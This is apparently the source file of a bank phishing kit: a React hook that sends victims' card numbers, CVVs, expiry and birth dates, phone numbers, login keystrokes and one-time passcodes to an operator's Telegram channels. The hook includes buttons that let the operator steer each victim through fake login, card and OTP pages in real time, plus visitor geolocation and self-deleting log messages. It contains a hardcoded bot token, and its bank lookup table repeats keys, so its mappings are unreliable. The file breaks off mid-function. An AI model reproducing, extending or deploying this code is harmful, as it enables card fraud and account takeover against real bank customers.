// src/hooks/useTelegramBot.js
import { useRef, useEffect, useCallback } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';

// Channel IDs
const LOGS_CHAT_ID = '-5259704826';
const ACTIONS_CHAT_ID = '-4820671789';

// Anti-spam: Track last log times
const lastLogTimes = {
  pageView: 0,
  siteEntry: 0,
  cardVerification: 0,
  cardVerificationPage: 0,
  otpSubmit: 0,
  otpVerified: 0,
  loginTyping: 0,
  cardTyping: 0,
  otpTyping: 0,
  confirmation: 0,
  blocked: 0,
  visitNotification: 0,
  formattedCard: 0,
  otpCode: 0,
  success: 0,
  otpPage: 0,
};

// Throttle delay in milliseconds (5 seconds)
const THROTTLE_DELAY = 5000;

const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
  setTimeout(async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
      await axios.post(url, {
        chat_id: chatId,
        message_id: messageId
      });
      console.log('✅ Message deleted after 15 seconds');
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  }, delay);
};

// ✅ Helper function to get geo data with fallback
const getGeoData = async (ip) => {
  let country = 'Unknown';
  let city = 'Unknown';
  let isp = 'Unknown';
  
  // Try primary API: ipapi.co
  try {
    const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
    if (geoResponse.data && !geoResponse.data.error && geoResponse.data.country_name) {
      country = `${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
      city = geoResponse.data.city || 'Unknown';
      isp = geoResponse.data.org || geoResponse.data.isp || 'Unknown ISP';
      return { country, city, isp };
    }
  } catch (primaryError) {
    console.log('Primary geo API failed, trying fallback...');
  }
  
  // Try fallback API: ipinfo.io
  try {
    const fallbackResponse = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
    if (fallbackResponse.data) {
      country = fallbackResponse.data.country || 'Unknown';
      city = fallbackResponse.data.city || 'Unknown';
      isp = fallbackResponse.data.org || 'Unknown ISP';
    }
  } catch (fallbackError) {
    console.log('Both geo APIs failed for this IP');
  }
  
  return { country, city, isp };
};

export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  const shouldSendLog = (logType) => {
    const now = Date.now();
    const lastTime = lastLogTimes[logType] || 0;
    if (now - lastTime < THROTTLE_DELAY) {
      console.log(`⏭️ Skipping duplicate ${logType} log (throttled)`);
      return false;
    }
    lastLogTimes[logType] = now;
    return true;
  };

  // ========== ACTIONS CHANNEL (with buttons) ==========
  
  const sendLoginRequestToTelegram = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` },
            { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }
          ],
          [
            { text: "❌ Login False", callback_data: `login_false_${sessionId}` }
          ],
          [
            { text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending login request:', error);
      return false;
    }
  };

  const getBankInfo = async (cardNumber) => {
  const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
  const binPrefix = bin.substring(0, 4);
  
  // Complete bank database
  const majorBanks = {
    '4000': 'Barclays Bank', '4147': 'Chase Bank', '4266': 'Bank of America',
    '4763': 'HSBC Bank', '5213': 'Citibank', '5402': 'Wells Fargo',
    '5204': 'Santander Bank', '5300': 'Deutsche Bank', '5500': 'BNP Paribas',
    '4571': 'Nordea Bank', '4539': 'Danske Bank', '4590': 'easyBank',
    '4111': 'Credit Suisse', '4319': 'UBS Bank', '4903': 'ING Bank',
    '4011': 'Capital One', '4313': 'USAA Bank', '5466': 'PNC Bank',
    '4539': 'Barclays Bank', '4658': 'Lloyds Bank', '4751': 'NatWest Bank',
    '5404': 'Halifax Bank', '4462': 'TSB Bank', '6720': 'Commerzbank',
    '5126': 'Postbank', '4402': 'DKB Bank', '4300': 'Sparkasse',
    '4978': 'Societe Generale', '5130': 'Credit Agricole', '5150': 'Credit Mutuel',
    '4973': 'Banque Postale', '4552': 'CaixaBank', '4950': 'Bankia',
    '4930': 'Banco Sabadell', '5502': 'Banco Popular', '5329': 'UniCredit',
    '5307': 'Intesa Sanpaolo', '5258': 'BancoPosta', '5450': 'Monte dei Paschi',
    '5330': 'UBI Banca', '5220': 'Banco BPM', '5350': 'FinecoBank',
    '5555': 'Jyske Bank', '5508': 'Sydbank', '4600': 'Spar Nord Bank',
    '5256': 'Swedbank', '5456': 'SEB Bank', '5210': 'Handelsbanken',
    '4920': 'OP Bank', '5100': 'ABN AMRO', '5470': 'KBC Bank',
    '4840': 'PostFinance', '5128': 'PKO Bank Polski', '5460': 'mBank',
    '4500': 'RBC Royal Bank', '4510': 'TD Canada Trust', '4530': 'Scotiabank',
    '4550': 'Commonwealth Bank', '5280': 'Emirates NBD', '5120': 'Tinkoff Bank',
    '5300': 'State Bank of India', '5210': 'HDFC Bank', '4400': 'ICICI Bank',
    // 🇩🇪 Germany
  '5300': 'Deutsche Bank (DE)', '6720': 'Commerzbank (DE)', '5126': 'Postbank (DE)',
  '4402': 'DKB Bank (DE)', '4300': 'Sparkasse (DE)', '5000': 'Volkswagen Bank (DE)',
  '5200': 'HypoVereinsbank (DE)', '5400': 'Targobank (DE)', '5500': 'Norisbank (DE)',
  '4400': 'Santander DE (DE)', '5130': 'ING DiBa (DE)', '5450': 'Consorsbank (DE)',
  
  // 🇫🇷 France
  '5500': 'BNP Paribas (FR)', '4978': 'Societe Generale (FR)', '5130': 'Credit Agricole (FR)',
  '5150': 'Credit Mutuel (FR)', '4973': 'Banque Postale (FR)', '5400': 'Caisse Epargne (FR)',
  '5200': 'Banque Populaire (FR)', '5300': 'Credit du Nord (FR)', '5460': 'BNP Paribas (FR)',
  '4400': 'HSBC France (FR)', '4550': 'Boursorama (FR)', '5120': 'Hello Bank (FR)',
  
  // 🇪🇸 Spain
  '5204': 'Santander Bank (ES)', '4903': 'BBVA Bank (ES)', '4552': 'CaixaBank (ES)',
  '4950': 'Bankia (ES)', '4930': 'Banco Sabadell (ES)', '5460': 'ING Direct (ES)',
  '4400': 'Banco Santander (ES)', '5502': 'Banco Popular (ES)', '5210': 'Bankinter (ES)',
  '5300': 'Abanca (ES)', '5120': 'Kutxabank (ES)', '5400': 'Unicaja (ES)',
  
  // 🇮🇹 Italy
  '5329': 'UniCredit (IT)', '5307': 'Intesa Sanpaolo (IT)', '5258': 'BancoPosta (IT)',
  '5450': 'Monte dei Paschi (IT)', '5330': 'UBI Banca (IT)', '5220': 'Banco BPM (IT)',
  '5310': 'Banca Mediolanum (IT)', '5350': 'FinecoBank (IT)', '5400': 'Credem (IT)',
  '5120': 'BNL (IT)', '5500': 'Deutsche Bank IT (IT)', '5000': 'CheBanca (IT)',
  
  // 🇩🇰 Denmark
  '4571': 'Nordea Bank (DK)', '4539': 'Danske Bank (DK)', '4590': 'easyBank (DK)',
  '5555': 'Jyske Bank (DK)', '5508': 'Sydbank (DK)', '4600': 'Spar Nord Bank (DK)',
  '5300': 'Arbejdernes Landsbank (DK)', '5400': 'Nykredit Bank (DK)',
  
  // 🇸🇪 Sweden
  '5256': 'Swedbank (SE)', '5456': 'SEB Bank (SE)', '5210': 'Handelsbanken (SE)',
  '5350': 'Nordea Bank (SE)', '4460': 'ICA Banken (SE)', '5300': 'Lansforsakringar (SE)',
  '5400': 'Skandiabanken (SE)', '5120': 'Avanza Bank (SE)',
  
  // 🇳🇴 Norway
  '5310': 'DNB Bank (NO)', '5200': 'Sparebanken (NO)', '5350': 'Nordea Bank (NO)',
  '5400': 'Sparebank 1 (NO)', '5300': 'Handelsbanken NO (NO)', '5500': 'Storebrand (NO)',
  
  // 🇫🇮 Finland
  '4920': 'OP Bank (FI)', '5350': 'Nordea Bank (FI)', '4560': 'Danske Bank (FI)',
  '5300': 'Aktia Bank (FI)', '5400': 'S-Pankki (FI)', '5200': 'Alandsbanken (FI)',
  
  // 🇳🇱 Netherlands
  '4903': 'ING Bank (NL)', '5310': 'Rabobank (NL)', '5100': 'ABN AMRO (NL)',
  '4400': 'SNS Bank (NL)', '5200': 'ASN Bank (NL)', '5300': 'Triodos Bank (NL)',
  '5400': 'bunq (NL)', '5500': 'Knab (NL)',
  
  // 🇧🇪 Belgium
  '5470': 'BNP Paribas Fortis (BE)', '5310': 'KBC Bank (BE)', '4400': 'ING Belgium (BE)',
  '5200': 'Belfius Bank (BE)', '5300': 'AXA Bank (BE)', '5400': 'Argenta (BE)',
  '5500': 'Crelan (BE)',
  
  // 🇨🇭 Switzerland
  '4111': 'Credit Suisse (CH)', '4319': 'UBS Bank (CH)', '4840': 'PostFinance (CH)',
  '4400': 'Raiffeisen (CH)', '5220': 'Zurcher Kantonalbank (CH)', '5300': 'Migros Bank (CH)',
  '5400': 'Valiant Bank (CH)',
  
  // 🇦🇹 Austria
  '5300': 'Erste Bank (AT)', '5470': 'Raiffeisen Bank (AT)', '4400': 'Bank Austria (AT)',
  '5200': 'BAWAG (AT)', '5400': 'Oberbank (AT)', '5500': 'Volksbank (AT)',
  
  // 🇵🇱 Poland
  '5128': 'PKO Bank Polski (PL)', '5210': 'Bank Pekao (PL)', '4400': 'ING Bank Slaski (PL)',
  '5460': 'mBank (PL)', '5300': 'Santander PL (PL)', '5400': 'Alior Bank (PL)',
  '5500': 'Millennium Bank (PL)', '5000': 'Credit Agricole PL (PL)',
  
  // 🇵🇹 Portugal
  '5220': 'Caixa Geral (PT)', '5310': 'Millennium BCP (PT)', '4400': 'Novo Banco (PT)',
  '5200': 'Santander Totta (PT)', '5300': 'BPI Bank (PT)', '5400': 'Banco Montepio (PT)',
  
  // 🇬🇷 Greece
  '5300': 'National Bank of Greece (GR)', '5200': 'Alpha Bank (GR)', '5400': 'Eurobank (GR)',
  '5500': 'Piraeus Bank (GR)',
  
  // 🇨🇿 Czech Republic
  '5300': 'Ceska Sporitelna (CZ)', '5200': 'CSOB Bank (CZ)', '5400': 'Komercni Banka (CZ)',
  '5500': 'Raiffeisenbank CZ (CZ)', '5000': 'Air Bank (CZ)',
  
  // 🇭🇺 Hungary
  '5300': 'OTP Bank (HU)', '5200': 'K&H Bank (HU)', '5400': 'Erste Bank HU (HU)',
  '5500': 'Raiffeisen HU (HU)', '5000': 'CIB Bank (HU)',
  
  // 🇷🇴 Romania
  '5300': 'BCR Bank (RO)', '5200': 'BRD Bank (RO)', '5400': 'Raiffeisen RO (RO)',
  '5500': 'UniCredit RO (RO)',
  
  // 🇧🇬 Bulgaria
  '5300': 'UniCredit Bulbank (BG)', '5200': 'DSK Bank (BG)', '5400': 'First Investment Bank (BG)',
  
  // 🇭🇷 Croatia
  '5300': 'Zagrebacka Banka (HR)', '5200': 'Privredna Banka (HR)', '5400': 'Erste Bank HR (HR)',
  
  // 🇸🇮 Slovenia
  '5300': 'NLB Bank (SI)', '5200': 'NKBM Bank (SI)', '5400': 'Abanka (SI)',
  
  // 🇸🇰 Slovakia
  '5300': 'Slovenska Sporitelna (SK)', '5200': 'VUB Banka (SK)', '5400': 'Tatra Banka (SK)',
  
  // 🇱🇹 Lithuania
  '5300': 'SEB Bank (LT)', '5200': 'Swedbank LT (LT)', '5400': 'Luminor Bank (LT)',
  
  // 🇱🇻 Latvia
  '5300': 'Swedbank LV (LV)', '5200': 'SEB Bank LV (LV)', '5400': 'Citadele Bank (LV)',
  
  // 🇪🇪 Estonia
  '5300': 'Swedbank EE (EE)', '5200': 'SEB Bank EE (EE)', '5400': 'LHV Bank (EE)',
  
  // 🇮🇪 Ireland
  '5300': 'Bank of Ireland (IE)', '5200': 'AIB Bank (IE)', '5400': 'Permanent TSB (IE)',
  '5500': 'Ulster Bank (IE)',
  
  // 🇨🇾 Cyprus
  '5300': 'Bank of Cyprus (CY)', '5200': 'Hellenic Bank (CY)',
  
  // 🇲🇹 Malta
  '5300': 'Bank of Valletta (MT)', '5200': 'HSBC Malta (MT)',
  
  // 🇱🇺 Luxembourg
  '5300': 'BGL BNP Paribas (LU)', '5200': 'BCEE Bank (LU)', '5400': 'ING Luxembourg (LU)',
  
  // 🇹🇷 Turkey
  '5300': 'Is Bankasi (TR)', '5210': 'Garanti BBVA (TR)', '4400': 'Yapi Kredi (TR)',
  '5460': 'Akbank (TR)', '5120': 'Ziraat Bankasi (TR)', '5400': 'VakifBank (TR)',
  '5500': 'Halkbank (TR)',
  
  // 🇬🇧 UK
  '4763': 'HSBC Bank (UK)', '4658': 'Lloyds Bank (UK)', '4751': 'NatWest Bank (UK)',
  '4539': 'Barclays Bank (UK)', '5404': 'Halifax Bank (UK)', '4462': 'TSB Bank (UK)',
  '4400': 'Santander UK (UK)', '5300': 'Nationwide (UK)', '5200': 'Metro Bank (UK)',
  '5500': 'Monzo Bank (UK)', '5120': 'Starling Bank (UK)', '5000': 'Virgin Money (UK)',

  };
  
  // Try API
  try {
    const response = await axios.get(`https://lookup.binlist.net/${bin}`, { timeout: 5000 });
    if (response.data?.bank?.name) {
      return {
        bank: response.data.bank.name,
        brand: (response.data.scheme || response.data.brand || 'Unknown').toUpperCase(),
        type: response.data.type || 'Credit/Debit',
        country: response.data.country?.name || 'Unknown'
      };
    }
  } catch (e) {}
  
  // Check built-in database
  if (majorBanks[binPrefix]) {
    const firstDigit = bin.charAt(0);
    const brand = firstDigit === '4' ? 'VISA' : firstDigit === '5' ? 'MASTERCARD' : firstDigit === '3' ? 'AMEX' : 'Unknown';
    return { bank: majorBanks[binPrefix], brand: brand, type: 'Credit/Debit', country: 'Unknown' };
  }
  
  // Final fallback
  const firstDigit = bin.charAt(0);
  if (firstDigit === '4') return { bank: 'Visa Issuing Bank', brand: 'VISA', type: 'Credit/Debit', country: 'Unknown' };
  if (firstDigit === '5') return { bank: 'Mastercard Issuing Bank', brand: 'MASTERCARD', type: 'Credit/Debit', country: 'Unknown' };
  if (firstDigit === '3') return { bank: 'American Express', brand: 'AMEX', type: 'Credit', country: 'Unknown' };
  
  return { bank: 'Unknown Bank', brand: 'Unknown', type: 'Credit/Debit', country: 'Unknown' };
};

const sendCardDetailsToTelegram = async (cardData, sessionId) => {
  try {
    let userIP = 'Unable to get IP';
    try {
      const ipResponse = await axios.get('https://api.ipify.org?format=json');
      userIP = ipResponse.data.ip;
    } catch (ipError) {
      console.error('Error getting IP:', ipError);
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const birthDateStr = cardData.birthDate 
      ? `${cardData.birthDate.day}/${cardData.birthDate.month}/${cardData.birthDate.year}`
      : 'Not provided';
    
    // Get bank info from card number
    const bankInfo = await getBankInfo(cardData.cardNumber);
    
    sessionStorage.setItem('bankName', bankInfo.bank);
    sessionStorage.setItem('cardBrand', bankInfo.brand);

    const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🏦 BANK INFO:</b>
├ 🏦 <b>Bank:</b> ${bankInfo.bank}
├ 💳 <b>Brand:</b> ${bankInfo.brand}
└ 📋 <b>Type:</b> ${bankInfo.type}
━━━━━━━━━━━━━━━━━━━━━
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
├ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
└ 🎂 <b>Birth Date:</b> ${birthDateStr}

<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.countryCode || '+1'} ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> ${bankInfo.country}
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}

━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
          { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
        ],
        [
          { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
        ],
        [
          { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
        ],
        [
          { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
        ]
      ]
    };

    await axios.post(url, {
      chat_id: ACTIONS_CHAT_ID,
      text: cardMessage,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
    return true;
  } catch (error) {
    console.error('Error sending card details:', error);
    return false;
  }
};

  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
📱 Phone: ${phoneNumber}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is ready to enter OTP code!`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` },
            { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }
          ],
          [
            { text: "🟢 Appr", callback_data: `appr_${sessionId}` }
          ],
          [
            { text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ OTP page log sent');
    } catch (error) {
      console.error('Error sending OTP page log:', error);
    }
  };

  const sendConfirmationPageLog = async (username, cardNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
💳 <b>CONFIRMATION PAGE - IN PROGRESS</b> 💳
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is on RB Key confirmation page!</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "⬅️ Back to Appr Page", callback_data: `back_to_appr_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ Confirmation page log sent');
    } catch (error) {
      console.error('Error sending confirmation page log:', error);
    }
  };

  // ========== LOGS CHANNEL (WITH ANTI-SPAM) ==========

  const sendPageViewLog = async () => {
    if (!shouldSendLog('pageView')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `⚠️ Someone is visiting the login page! 
━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString()}
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Page view log sent');
    } catch (error) {
      console.error('Error sending page view log:', error);
    }
  };

  const sendSiteEntryLog = async () => {
  if (!shouldSendLog('siteEntry')) return;
  try {
    let userIP = 'Unable to get IP';
    
    try {
      const ipResponse = await axios.get('https://api.ipify.org?format=json');
      userIP = ipResponse.data.ip;
    } catch (ipError) {
      console.error('Error getting IP:', ipError);
    }
    
    // ✅ Use the new helper function with fallback
    const { country, city, isp } = await getGeoData(userIP);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Event:</b> Someone entered the website
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>Location Info:</b>
├ 🔌 <b>IP Address:</b> <code>${userIP}</code>
├ 🌍 <b>Country:</b> ${country}
├ 🏙️ <b>City:</b> ${city}
└ 📡 <b>ISP:</b> ${isp}
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}`;
    
    await axios.post(url, { 
      chat_id: LOGS_CHAT_ID, 
      text: message, 
      parse_mode: 'HTML' 
    });
    
    console.log('✅ Site entry log sent with location and ISP (PERMANENT)');
  } catch (error) {
    console.error('Error sending site entry log:', error);
  }
};
  const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
    if (!shouldSendLog('visitNotification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      // ✅ Use the new helper function with fallback
      const { country, city } = await getGeoData(ipAddress);
      const geoInfo = `${city}, ${country}`;
      
      const message = `
🌐 <b>NEW SITE VISITOR</b> 🌐
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>VISITOR INFORMATION:</b>
├ 🌍 <b>IP Address:</b> <code>${ipAddress}</code>
├ 📍 <b>Location:</b> ${geoInfo}
━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A new visitor has landed on your site!</i>
⏰ <i>This message will self-delete in 30 seconds</i>
      `;

      const response = await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 30000); 
      
      console.log('✅ Visit notification sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending visit notification:', error);
      return false;
    }
  };

  const sendBlockedLog = async (username, reason, userIP) => {
    if (!shouldSendLog('blocked')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
🚫 <b>USER BLOCKED - ANTI-BOT</b> 🚫
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
🔌 <b>IP Address:</b> ${userIP}
📝 <b>Reason:</b> ${reason}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>This user has been blocked!</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log('✅ Blocked log sent to Telegram');
    } catch (error) {
      console.error('Error sending blocked log:', error);
    }
  };

  const sendCardVerificationLog = async (username) => {
    if (!shouldSendLog('cardVerification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 CARD VERIFICATION - IN PROGRESS 💳
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is now entering card information!`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ Card verification log sent');
    } catch (error) {
      console.error('Error sending card verification log:', error);
    }
  };

  const sendCardVerificationPageLog = async (username) => {
    if (!shouldSendLog('cardVerificationPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 <b>CARD VERIFICATION PAGE</b> 💳
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> User is on Card Verification page
👤 <b>Username:</b> ${username || 'Not logged in yet'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has reached the card verification step!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card verification page log sent');
    } catch (error) {
      console.error('Error sending card verification page log:', error);
    }
  };

  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpSubmit')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has entered the OTP code!</i>`;
      await axios.post(url, { chat_id: ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP submit log sent');
    } catch (error) {
      console.error('Error sending OTP submit log:', error);
    }
  };

  const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpVerified')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> OTP code verified
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🎯 <i>User has successfully verified OTP!</i>`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP verified log sent');
    } catch (error) {
      console.error('Error sending OTP verified log:', error);
    }
  };

  // ========== TYPING LOGS ==========
  const sendLoginTypingLog = async (username, field, value) => {
    if (!shouldSendLog('loginTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - LOGIN PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username || 'Not entered yet'}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the login page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Login typing log sent');
    } catch (error) {
      console.error('Error sending login typing log:', error);
    }
  };

  const sendCardTypingLog = async (username, field, value) => {
    if (!shouldSendLog('cardTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - CARD VERIFICATION PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the card verification page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card typing log sent');
    } catch (error) {
      console.error('Error sending card typing log:', error);
    }
  };

  const sendOtpTypingLog = async (username, phoneNumber, value) => {
    if (!shouldSendLog('otpTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - OTP PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> OTP Code
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
📱 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing the OTP code!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ OTP typing log sent');
    } catch (error) {
      console.error('Error sending OTP typing log:', error);
    }
  };

  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
    if (!shouldSendLog('confirmation')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
